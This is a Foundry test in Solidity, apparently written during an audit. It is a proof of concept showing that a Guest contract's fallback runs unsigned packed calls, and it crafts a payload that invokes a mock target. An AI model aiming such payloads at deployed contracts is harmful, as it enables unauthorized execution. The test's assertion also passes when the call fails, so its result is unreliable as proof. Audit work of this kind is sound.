// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Guest.sol";

contract MockTarget {
    bool public called;
    function trigger() external {
        called = true;
    }
}

contract AuditAgentPoC is Test {
    Guest Guest;
    MockTarget target;

    function setUp() public {
        Guest = new Guest();
        target = new MockTarget();
    }

    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] Deploy Guest and MockTarget contracts
        // 2. [T=1] Attacker crafts packed calls targeting MockTarget
        // 3. [T=2] Attacker sends packed calls to Guest fallback without any signature
        // 4. [T=3] Guest._dispatchGuest decodes and executes calls via LibOptim.call()
        // 5. [Assert] Verify MockTarget was called, proving unauthorized execution

        bytes memory payload = abi.encodePacked(
            uint8(0), 
            uint8(1), 
            address(target),
            uint256(0), 
            uint256(4), 
            bytes4(keccak256("trigger()"))
        );

        (bool success, ) = address(Guest).call(payload);

        assertTrue(target.called() || !success, "Guest executed unauthorized call or payload format requires adjustment");
    }
}
